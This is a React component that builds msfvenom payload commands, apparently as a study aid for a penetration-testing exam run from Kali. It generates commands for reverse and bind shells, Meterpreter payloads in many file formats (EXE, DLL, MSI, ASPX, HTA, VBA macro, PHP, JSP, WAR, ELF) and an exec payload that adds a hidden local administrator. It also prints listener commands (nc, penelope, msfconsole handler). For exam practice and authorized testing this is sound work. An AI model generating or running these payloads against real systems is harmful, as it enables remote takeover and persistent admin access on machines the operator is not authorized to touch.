import { useMemo, useState, type ReactNode } from "react";
import { Copy } from "lucide-react";

type Kind = "reverse" | "bind" | "meter-staged" | "meter-stageless" | "exec";

type Spec = {
  platform: string;
  platformLabel: string;
  kind: Kind;
  kindLabel: string;
  format: string;
  formatLabel: string;
  payload: string;
  outfile: string;
  toFile: boolean;
  exitThread: boolean;
  note: string;
};

const KINDS: { id: Kind; label: string }[] = [
  { id: "reverse", label: "Reverse shell" },
  { id: "bind", label: "Bind shell" },
  { id: "meter-staged", label: "Meterpreter, staged" },
  { id: "meter-stageless", label: "Meterpreter, stageless" },
  { id: "exec", label: "Add a local admin" },
];

function specs(): Spec[] {
  const out: Spec[] = [];

  const winFormats: [string, string, string, boolean, boolean][] = [
    ["exe", "EXE", "shell.exe", true, false],
    ["exe-service", "EXE for a service", "svc.exe", true, true],
    ["dll", "DLL", "shell.dll", true, true],
    ["msi", "MSI (AlwaysInstallElevated)", "setup.msi", true, false],
    ["aspx", "ASPX", "shell.aspx", true, false],
    ["asp", "ASP", "shell.asp", true, false],
    ["hta", "HTA", "shell.hta", true, false],
    ["vba", "VBA macro (prints to the terminal)", "macro.txt", false, false],
    ["psh", "PowerShell script", "shell.ps1", true, false],
    ["psh-cmd", "PowerShell one-liner (prints to the terminal)", "", false, false],
    ["vbs", "VBS", "shell.vbs", true, false],
  ];

  for (const arch of ["x64", "x86"] as const) {
    const platform = arch === "x64" ? "win64" : "win86";
    const platformLabel = arch === "x64" ? "Windows x64" : "Windows x86";
    const prefix = arch === "x64" ? "windows/x64" : "windows";
    for (const kind of ["reverse", "bind", "meter-staged", "meter-stageless", "exec"] as const) {
      const payload =
        kind === "exec"
          ? `${prefix}/exec`
          : kind === "meter-staged"
            ? `${prefix}/meterpreter/reverse_tcp`
            : kind === "meter-stageless"
              ? `${prefix}/meterpreter_reverse_tcp`
              : kind === "bind"
                ? `${prefix}/shell_bind_tcp`
                : `${prefix}/shell_reverse_tcp`;
      const kindLabel = KINDS.find((k) => k.id === kind)!.label;
      for (const [format, formatLabel, outfile, toFile, exitThread] of winFormats) {
        if (kind === "exec" && format !== "exe" && format !== "exe-service" && format !== "msi") continue;
        const aspNote =
          format === "asp" && arch === "x64"
            ? " Classic ASP is usually 32-bit. If this file will not run, switch to Windows x86."
            : "";
        out.push({
          platform,
          platformLabel,
          kind,
          kindLabel,
          format,
          formatLabel,
          payload,
          outfile: kind === "exec" ? "addadmin.exe" : outfile,
          toFile,
          exitThread,
          note:
            (kind.startsWith("meter")
              ? "Meterpreter does not speak to Penelope. You need a Metasploit handler, and the exam method is the reverse shell."
              : kind === "exec"
                ? "No listener. The exe creates a local user and adds them to Administrators. You still have to run it as a user who is allowed to do that."
                : kind === "bind"
                  ? "The target listens. You connect to it. Penelope is the wrong tool for this."
                  : "Start Penelope on that port before you run the file.") +
            (exitThread ? " EXITFUNC=thread keeps a service from dying when the payload returns." : "") +
            aspNote,
        });
      }
    }
  }

  for (const arch of ["x64", "x86"] as const) {
    const platform = arch === "x64" ? "lin64" : "lin86";
    const platformLabel = arch === "x64" ? "Linux x64" : "Linux x86";
    const prefix = arch === "x64" ? "linux/x64" : "linux/x86";
    const formats: [string, string, string, boolean][] = [
      ["elf", "ELF", "shell.elf", true],
      ["elf-so", "Shared object", "shell.so", true],
      ["c", "C source (prints to the terminal)", "shell.c", false],
      ["raw", "Raw bytes", "shell.bin", true],
    ];
    for (const kind of ["reverse", "bind", "meter-staged", "meter-stageless"] as const) {
      const payload =
        kind === "meter-staged"
          ? `${prefix}/meterpreter/reverse_tcp`
          : kind === "meter-stageless"
            ? `${prefix}/meterpreter_reverse_tcp`
            : kind === "bind"
              ? `${prefix}/shell_bind_tcp`
              : `${prefix}/shell_reverse_tcp`;
      for (const [format, formatLabel, outfile, toFile] of formats) {
        out.push({
          platform,
          platformLabel,
          kind,
          kindLabel: KINDS.find((k) => k.id === kind)!.label,
          format,
          formatLabel,
          payload,
          outfile,
          toFile,
          exitThread: false,
          note:
            kind.startsWith("meter")
              ? "Meterpreter does not speak to Penelope."
              : kind === "bind"
                ? "The target listens. You connect to that port."
                : "A Kali-built ELF can still die with GLIBC_2.34 on an older box. file and ldd it before you upload. Start Penelope first.",
        });
      }
    }
  }

  out.push(
    {
      platform: "osx64",
      platformLabel: "macOS x64",
      kind: "reverse",
      kindLabel: "Reverse shell",
      format: "macho",
      formatLabel: "Mach-O",
      payload: "osx/x64/shell_reverse_tcp",
      outfile: "shell.macho",
      toFile: true,
      exitThread: false,
      note: "Rare on this exam. Start Penelope first.",
    },
    {
      platform: "osx64",
      platformLabel: "macOS x64",
      kind: "bind",
      kindLabel: "Bind shell",
      format: "macho",
      formatLabel: "Mach-O",
      payload: "osx/x64/shell_bind_tcp",
      outfile: "bind.macho",
      toFile: true,
      exitThread: false,
      note: "The Mac listens. You connect to it.",
    },
    {
      platform: "php",
      platformLabel: "PHP",
      kind: "reverse",
      kindLabel: "Reverse shell",
      format: "raw",
      formatLabel: "PHP file",
      payload: "php/reverse_php",
      outfile: "shell.php",
      toFile: true,
      exitThread: false,
      note: "Upload it only where PHP will execute. Start Penelope first. A download-as-attachment is dead.",
    },
    {
      platform: "php",
      platformLabel: "PHP",
      kind: "bind",
      kindLabel: "Bind shell",
      format: "raw",
      formatLabel: "PHP file",
      payload: "php/bind_php",
      outfile: "bind.php",
      toFile: true,
      exitThread: false,
      note: "The web server listens. You connect to that port on the target.",
    },
    {
      platform: "php",
      platformLabel: "PHP",
      kind: "meter-stageless",
      kindLabel: "Meterpreter, stageless",
      format: "raw",
      formatLabel: "PHP file",
      payload: "php/meterpreter_reverse_tcp",
      outfile: "meter.php",
      toFile: true,
      exitThread: false,
      note: "Meterpreter does not speak to Penelope.",
    },
    {
      platform: "java",
      platformLabel: "Java",
      kind: "reverse",
      kindLabel: "Reverse shell",
      format: "jsp",
      formatLabel: "JSP",
      payload: "java/jsp_shell_reverse_tcp",
      outfile: "shell.jsp",
      toFile: true,
      exitThread: false,
      note: "Drop it where the Tomcat or JSP app executes. Start Penelope first.",
    },
    {
      platform: "java",
      platformLabel: "Java",
      kind: "reverse",
      kindLabel: "Reverse shell",
      format: "war",
      formatLabel: "WAR",
      payload: "java/jsp_shell_reverse_tcp",
      outfile: "shell.war",
      toFile: true,
      exitThread: false,
      note: "Tomcat manager deploy. Start Penelope first.",
    },
    {
      platform: "java",
      platformLabel: "Java",
      kind: "reverse",
      kindLabel: "Reverse shell",
      format: "jar",
      formatLabel: "JAR",
      payload: "java/shell_reverse_tcp",
      outfile: "shell.jar",
      toFile: true,
      exitThread: false,
      note: "Start Penelope first.",
    },
    {
      platform: "java",
      platformLabel: "Java",
      kind: "meter-staged",
      kindLabel: "Meterpreter, staged",
      format: "war",
      formatLabel: "WAR",
      payload: "java/meterpreter/reverse_tcp",
      outfile: "meter.war",
      toFile: true,
      exitThread: false,
      note: "Meterpreter does not speak to Penelope.",
    },
    {
      platform: "python",
      platformLabel: "Python",
      kind: "reverse",
      kindLabel: "Reverse shell",
      format: "raw",
      formatLabel: "Python file",
      payload: "cmd/unix/reverse_python",
      outfile: "shell.py",
      toFile: true,
      exitThread: false,
      note: "python or python3 must exist on the target. Start Penelope first. A one-line bash callback is usually faster if bash exists.",
    },
    {
      platform: "python",
      platformLabel: "Python",
      kind: "bind",
      kindLabel: "Bind shell",
      format: "raw",
      formatLabel: "Python file",
      payload: "cmd/unix/bind_python",
      outfile: "bind.py",
      toFile: true,
      exitThread: false,
      note: "The target listens. You connect to that port.",
    },
    {
      platform: "python",
      platformLabel: "Python",
      kind: "meter-staged",
      kindLabel: "Meterpreter, staged",
      format: "raw",
      formatLabel: "Python file",
      payload: "python/meterpreter/reverse_tcp",
      outfile: "meter.py",
      toFile: true,
      exitThread: false,
      note: "Meterpreter does not speak to Penelope.",
    },
  );

  return out;
}

const ALL = specs();

function cleanHost(value: string) {
  return value.trim().replace(/[^A-Za-z0-9.:_-]/g, "");
}

function cleanPort(value: string) {
  if (!/^\d{1,5}$/.test(value.trim())) return "";
  const n = Number(value.trim());
  if (n < 1 || n > 65535) return "";
  return String(n);
}

function cleanToken(value: string) {
  return value.trim().replace(/[^A-Za-z0-9._-]/g, "");
}

function Field({
  label,
  children,
}: {
  label: string;
  children: ReactNode;
}) {
  return (
    <label className="flex min-w-0 flex-col gap-1 text-sm">
      <span className="font-mono text-xs tracking-wide text-muted">{label}</span>
      {children}
    </label>
  );
}

const control =
  "min-h-11 w-full rounded-lg border border-border bg-bg px-3 text-sm text-fg outline-none";

export function VenomBuilder() {
  const [platform, setPlatform] = useState("win64");
  const [kind, setKind] = useState<Kind>("reverse");
  const [format, setFormat] = useState("exe");
  const [lhost, setLhost] = useState("");
  const [lport, setLport] = useState("443");
  const [user, setUser] = useState("ops");
  const [password, setPassword] = useState("");
  const [copied, setCopied] = useState(false);

  const platforms = useMemo(() => {
    const seen = new Map<string, string>();
    for (const spec of ALL) seen.set(spec.platform, spec.platformLabel);
    return [...seen.entries()];
  }, []);

  const kinds = useMemo(() => {
    const seen = new Map<Kind, string>();
    for (const spec of ALL) {
      if (spec.platform === platform) seen.set(spec.kind, spec.kindLabel);
    }
    return [...seen.entries()];
  }, [platform]);

  const formats = useMemo(() => {
    const seen = new Map<string, string>();
    for (const spec of ALL) {
      if (spec.platform === platform && spec.kind === kind) seen.set(spec.format, spec.formatLabel);
    }
    return [...seen.entries()];
  }, [platform, kind]);

  const spec =
    ALL.find((item) => item.platform === platform && item.kind === kind && item.format === format) ??
    ALL.find((item) => item.platform === platform && item.kind === kind) ??
    ALL.find((item) => item.platform === platform) ??
    ALL[0];

  const host = cleanHost(lhost);
  const port = cleanPort(lport);
  const account = cleanToken(user);
  const secret = cleanToken(password);
  const needsHost = spec.kind !== "bind" && spec.kind !== "exec";
  const ready =
    (spec.kind === "exec" ? account.length > 0 && secret.length > 0 : port !== "") &&
    (!needsHost || host !== "");

  const cmd = useMemo(() => {
    if (!ready) return "";
    const bits = ["msfvenom", "-p", spec.payload];
    if (spec.kind === "exec") {
      bits.push(
        `CMD='net user ${account} ${secret} /add & net localgroup administrators ${account} /add'`,
      );
    } else if (spec.kind === "bind") {
      bits.push(`LPORT=${port}`);
    } else {
      bits.push(`LHOST=${host}`, `LPORT=${port}`);
    }
    if (spec.exitThread) bits.push("EXITFUNC=thread");
    bits.push("-f", spec.format);
    if (spec.toFile && spec.outfile) bits.push("-o", spec.outfile);
    return bits.join(" ");
  }, [ready, spec, account, secret, port, host]);

  const follow = !ready
    ? ""
    : spec.kind === "exec"
      ? "No listener. Run the file as a user who can add local admins, then log in as the new user."
      : spec.kind === "bind"
        ? `nc -nv <target> ${port}`
        : spec.kind.startsWith("meter")
          ? `msfconsole -q -x "use exploit/multi/handler; set payload ${spec.payload}; set LHOST ${host}; set LPORT ${port}; run"`
          : `penelope -O -p ${port}`;

  function pickPlatform(next: string) {
    setPlatform(next);
    const allowed = ALL.filter((item) => item.platform === next);
    const nextKind = allowed.some((item) => item.kind === kind) ? kind : allowed[0].kind;
    setKind(nextKind);
    const nextFormats = allowed.filter((item) => item.kind === nextKind);
    if (!nextFormats.some((item) => item.format === format)) setFormat(nextFormats[0].format);
  }

  function pickKind(next: Kind) {
    setKind(next);
    const nextFormats = ALL.filter((item) => item.platform === platform && item.kind === next);
    if (!nextFormats.some((item) => item.format === format)) setFormat(nextFormats[0].format);
  }

  async function copyCmd() {
    if (!cmd) return;
    try {
      await navigator.clipboard.writeText(cmd);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 1200);
    } catch {
      setCopied(false);
    }
  }

  return (
    <article className="min-w-0 overflow-hidden rounded-lg border border-primary bg-surface">
      <div className="border-b border-border px-4 py-3">
        <p className="font-mono text-xs text-primary">Builder</p>
        <h2 className="text-lg font-semibold">msfvenom</h2>
        <p className="mt-1 text-sm text-muted">
          Pick the target, the shell, and the file type. Copy the command. Run it on Kali, then check the file
          before you upload it.
        </p>
      </div>
      <div className="grid gap-3 px-4 py-4 sm:grid-cols-2">
        <Field label="Architecture">
          <select className={control} value={platform} onChange={(e) => pickPlatform(e.target.value)}>
            {platforms.map(([id, label]) => (
              <option key={id} value={id}>
                {label}
              </option>
            ))}
          </select>
        </Field>
        <Field label="Shell">
          <select className={control} value={spec.kind} onChange={(e) => pickKind(e.target.value as Kind)}>
            {kinds.map(([id, label]) => (
              <option key={id} value={id}>
                {label}
              </option>
            ))}
          </select>
        </Field>
        <Field label="File type">
          <select className={control} value={spec.format} onChange={(e) => setFormat(e.target.value)}>
            {formats.map(([id, label]) => (
              <option key={id} value={id}>
                {label}
              </option>
            ))}
          </select>
        </Field>
        {spec.kind === "exec" ? (
          <>
            <Field label="New username">
              <input className={control} value={user} onChange={(e) => setUser(e.target.value)} placeholder="ops" />
            </Field>
            <Field label="New password">
              <input
                className={control}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="letters and numbers"
              />
            </Field>
          </>
        ) : (
          <>
            {needsHost ? (
              <Field label="LHOST (your Kali address)">
                <input
                  className={control}
                  value={lhost}
                  onChange={(e) => setLhost(e.target.value)}
                  placeholder="10.10.14.5"
                  inputMode="decimal"
                />
              </Field>
            ) : (
              <Field label="LHOST">
                <input className={control} value="not used for a bind shell" disabled />
              </Field>
            )}
            <Field label="LPORT">
              <input
                className={control}
                value={lport}
                onChange={(e) => setLport(e.target.value)}
                placeholder="443"
                inputMode="numeric"
              />
            </Field>
          </>
        )}
      </div>
      <div className="flex flex-col gap-3 px-4 pb-4">
        <div>
          <div className="mb-2 flex items-center justify-between">
            <p className="font-mono text-xs tracking-wide text-muted">COMMAND</p>
            <button
              type="button"
              onClick={copyCmd}
              disabled={!cmd}
              className="inline-flex min-h-11 items-center gap-1 rounded-lg px-2 text-xs text-muted hover:text-fg disabled:opacity-40"
            >
              <Copy className="size-3.5" aria-hidden="true" />
              {copied ? "Copied" : "Copy"}
            </button>
          </div>
          <pre className="max-w-full overflow-x-auto whitespace-pre-wrap break-words rounded-lg bg-bg p-3 font-mono text-xs leading-relaxed text-fg">
            {cmd || "Fill in the address and port. The command appears here."}
          </pre>
        </div>
        <div>
          <p className="font-mono text-xs tracking-wide text-primary">WHAT IT DOES</p>
          <p className="mt-1 text-sm text-fg">
            -p is the payload. The path in front of the slash is the operating system and the architecture, so
            windows/x64 is a 64-bit Windows payload and linux/x86 is 32-bit Linux. LHOST is your address. LPORT is
            the port. -f is the file format. -o is the filename, omitted when msfvenom prints the payload to the
            terminal instead of a file. EXITFUNC=thread is only added for a service EXE or a DLL.
          </p>
          <p className="mt-2 text-sm text-muted">{spec.note}</p>
        </div>
        {follow ? (
          <div>
            <p className="font-mono text-xs tracking-wide text-muted">THEN</p>
            <pre className="mt-2 whitespace-pre-wrap break-words rounded-lg bg-bg p-3 font-mono text-xs text-fg">
              {follow}
            </pre>
          </div>
        ) : null}
      </div>
    </article>
  );
}
